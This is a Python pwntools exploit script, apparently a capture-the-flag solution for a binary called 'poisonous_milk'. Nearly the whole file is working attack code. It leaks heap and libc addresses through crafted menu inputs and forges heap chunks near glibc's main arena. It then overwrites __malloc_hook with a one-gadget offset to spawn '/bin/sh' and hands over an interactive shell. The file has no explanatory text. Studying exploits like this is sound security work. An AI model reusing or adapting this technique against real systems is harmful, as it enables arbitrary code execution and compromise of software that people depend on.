from pwn import *
import time


# local process envirnoment
LOCAL = True
elf_name = "./poisonous_milk"
run_argv = [elf_name, "200"]

#retmote args
remote_host = "127.0.0.1"
remote_port = 22333

if LOCAL:
    elf = ELF(elf_name)
    #context.clear(arch="i386")
    context.clear(arch="amd64")
    #context.log_level = "debug"
    mine_env = os.environ
    #mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86-linux-gnu/dealarm.so"
    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so:./libc-2.23.so"
    #io = process(argv=run_argv, env=mine_env)
    io = process(elf_name)
    free_offset = 0x45390
    execve_binsh_off = 0xf0567
    #execve_binsh_off = 0x4526A
    #execve_binsh_off = 0xF5B10
else:
    io = remote(remote_host, remote_port)

def mmenu(opt):
    io.recvuntil("> ")
    io.sendline(opt)

def put_milk(st_flags, color):
    mmenu('p')
    io.recvuntil("flags (0-99): ")
    io.send(st_flags)
    io.recvuntil("Input your milk's color: ")
    io.sendline(color)

def view_milk():
    mmenu('v')

def remove_milk(index):
    mmenu('r')
    io.recvuntil("Give the index : ")
    io.sendline(str(index))

def drink_milk():
    mmenu('d')

def quit_milk():
    mmenu('q')

def s_leak():
    put_milk("a"*0x08+"\n", "red")
    remove_milk(0)
    payload = 'a'*0x10
    payload += 'b'*0x08 + p64(0x51)
    payload += '\n'
    put_milk(payload, "none")
    view_milk()
    io.recvuntil("[0] [")
    lk_heap_addr = u64((io.recvuntil("]")[:-1].ljust(8, chr(0)))) - 0x78
    log.info("heap address: "+hex(lk_heap_addr))
    # leak libc
    #
    # fake list
    payload = 2 * p64(lk_heap_addr+0xE0)
    payload += p64(lk_heap_addr+0x190)
    payload += p64(lk_heap_addr+0x1a0)
    payload += p64(lk_heap_addr+0x1b0) + p64(lk_heap_addr+0x1c0)
    payload = payload + '\n'
    put_milk(payload, "red")
    # fake chunk0 string
    payload = 'f'*8 + p64(0x101)
    payload += 'f'*0x0C + '\n'
    put_milk(payload, "red")
    # fake chunk0 struct
    payload = 2*p64(0x51)
    payload += p64(lk_heap_addr+0x2a0) + p64(lk_heap_addr+0x130)
    payload += p64(lk_heap_addr+0x2a0) + p64(lk_heap_addr+0x130)
    payload += p64(lk_heap_addr+0x2a0) + p64(lk_heap_addr+0x160)
    payload += p64(lk_heap_addr+0x2a0) + p64(lk_heap_addr+0x80) + '\n'
    put_milk(payload, "red")
    #
    payload = 'v'*0x08 + p64(0x51)
    payload += 'v'*0x10 + '\n'
    put_milk(payload, "red")
    put_milk(payload, "red")
    #raw_input("del?")
    # drop milk struct
    drink_milk()
    payload = p64(lk_heap_addr+0xd0) + p64(lk_heap_addr+0xe8)
    payload += '\n'
    put_milk(payload, "red")
    remove_milk(0)
    view_milk()
    io.recvuntil("[0] [")
    main_roda_addr = u64((io.recvuntil("] ")[:-2].ljust(8, chr(0))))
    libc_base_addr = u64((io.recvuntil("\n")[:-1].ljust(8, chr(0)))) - 0x3C3B78 # small bin top offset
    return {'heap_base':lk_heap_addr, 'libc_base':libc_base_addr, 'main_addr':main_roda_addr}

def s_exp():
    lk_data = s_leak()
    # 0x7fb0c14d3b20 - 0x7fb0c1110000 = 0x3C3B20
    #  00007F1FEEE4C000 00000000003C5000
    # +45

    lk_heap_addr = lk_data['heap_base']
    libc_base_addr = lk_data['libc_base']
    main_roda_addr = lk_data['main_addr']
    log.info("libc address: "+hex(libc_base_addr))
    log.info("color address: "+hex(main_roda_addr))
    ch_of = int(hex(lk_heap_addr)[2:4], 16)
    if ch_of != 0x56:
        return

    fake_chunk_addr = libc_base_addr + 0x3c3b45 # shift main arena offset
    log.info("main arena address: "+hex(fake_chunk_addr))

    raw_input("exp?")
    payload = p64(0) + p64(0x51)
    payload += p64(fake_chunk_addr) + p64(lk_heap_addr+0x130)
    payload += p64(lk_heap_addr+0x2a0) + p64(lk_heap_addr+0x130)
    payload += p64(lk_heap_addr+0x2a0) + p64(lk_heap_addr+0xa0)
    payload += p64(lk_heap_addr+0x2a0) + p64(lk_heap_addr+0x80) + '\n'
    put_milk(payload, "red")

    payload = 'a'*0x08 + p64(lk_heap_addr+0x130)
    payload += p64(lk_heap_addr+0x2a0) + p64(lk_heap_addr+0x130)
    payload += p64(lk_heap_addr+0x2a0) + p64(lk_heap_addr+0xa0)
    payload += p64(lk_heap_addr+0x2a0) + p64(lk_heap_addr+0x80) + '\n'
    put_milk(payload, "red")

    payload = 'b'*0x50 + '\n'
    put_milk(payload, "red")
    payload = 'b'*0x50 + '\n'
    put_milk(payload, "red")
    payload = 'b'*0x50 + '\n'
    put_milk(payload, "red")
    payload = 'b'*0x50 + '\n'
    put_milk(payload, "red")
    remove_milk(5)
    remove_milk(6)

    #raw_input("exp?")
    payload = chr(0)*3
    payload += p64(0)*4
    payload += p64(libc_base_addr+0x3C3AF8)     # hook_malloc-0x18 offset
    payload += p64(0)
    payload += p64(libc_base_addr+0x3C3B78)*2
    payload = payload.ljust(0x41, chr(0)) + '\n'
    put_milk(payload, "red")

    time.sleep(0.05)

    payload = "/bin/sh\x00"
    payload += p64(libc_base_addr+execve_binsh_off)
    payload = payload.ljust(0x31, chr(0)) + '\n'
    put_milk(payload, "red")
    time.sleep(0.05)
    put_milk(payload, "red")
    time.sleep(0.05)
    io.interactive()
    put_milk(payload, "red")
    remove_milk(5)
    raw_input("end")

if __name__ == "__main__":
    #raw_input("start")
    s_exp()
